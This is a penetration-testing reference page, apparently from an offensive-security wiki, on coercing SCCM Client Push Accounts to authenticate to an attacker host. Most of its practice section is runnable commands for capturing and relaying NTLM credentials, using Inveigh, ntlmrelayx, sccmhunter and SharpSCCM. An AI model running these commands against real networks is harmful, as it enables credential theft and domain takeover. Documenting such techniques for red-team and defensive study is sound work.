---
authors: BlWasp, ShutdownRepo, q-roland, felixbillieres
category: ad
---

# Client Push account authentication coercion

## Theory

If SCCM is deployed via Client Push Accounts, it is possible, from a compromised SCCM client, to coerce the Client Push Account into authenticating to an arbitrary remote resource. It is then possible to retrieve NTLM authentication data in order to crack the account's password or relay the data to other services. Client Push Accounts are privileged as they are required to have local administrator rights on workstations on which they deploy the SCCM client.

> [!TIP]
> For additional attack techniques and defense strategies related to client push account coercion in SCCM, refer to the following techniques from the [Misconfiguration-Manager repository](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques):
> - [ELEVATE-2: Relay Client Push Installation](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-2/ELEVATE-2_description.md)
> - [ELEVATE-3: Relay Client Push Installation (with AD System Discovery)](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-3/ELEVATE-3_description.md)
> - [COERCE-2: CcmExec Coercion](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/COERCE/COERCE-2/coerce-2_description.md)

> [!TIP]
> In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.

## Practice

### Authentication Coercion via Client Push Installation

The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.

#### Option 1: Wait for Client Push Installation

```powershell
# Credential capture using Inveigh 
Inveigh.exe
```

#### Option 2: Forcefully "coerce" the Client Push Installation

> [!WARNING]
> One should read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) before continuing, as this attack might leave traces behind and might mess things up with the SCCM environment.

##### Step 1: prepare coercion listener

Note that you can either capture and crack received credentials or relay them to a suitable target system (or both). Possible targets include the SCCM database (MSSQL), which is usually not signed, the management point (SMB), or the site server (HTTP), etc. depending on client push user privileges and whether signing or encryption is enabled.
::: tabs
=== UNIX-like


```bash
# Relay using ntlmrelayx.py
ntlmrelayx.py -smb2support -socks -ts -ip $ATTACKER_IP -t $TARGET
```

=== Windows

Credential capture using Inveigh:

```powershell
Inveigh.exe
```

:::

##### Step 2: trigger Client-Push Installation
::: tabs

=== UNIX-like


```bash
# A. With a user/machine account that will:
#    (1) create a new machine account in the domain
#    (2) register a new client
python3 sccmhunter.py http -mp $TARGET -u $USER -p "$PASSWORD" -sleep 3 -sp -spcn $ATTACKER_IP -dc-ip $DC_IP -d $DOMAIN

# B. Unauthenticated registration (may not work in all cases), proven to be efficiant during tests
python3 sccmhunter.py http -mp $TARGET -sleep 10 -sp -spcn $ATTACKER_IP -dc-ip $DC_IP -d $DOMAIN -sppid 'Microsoft Windows NT Server 10.0' --sccm-push-anonymous
```

=== Windows

```powershell
# If admin access over Management Point (MP)
SharpSCCM.exe invoke client-push -t $TARGET --as-admin

# If not MP admin
SharpSCCM.exe invoke client-push -t $TARGET
```

:::

##### Step 3: cleanup

If you run the above SharpSCCM command with the `--as-admin` parameter (since you have admin privileges over the MP), there's nothing to do. Otherwise, get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t $TARGET` parameter. This is the device name that will appear in SCCM.

## Resources

[https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts](https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts)

[https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)

[https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/ELEVATE](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/ELEVATE)

[https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/COERCE](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/COERCE)

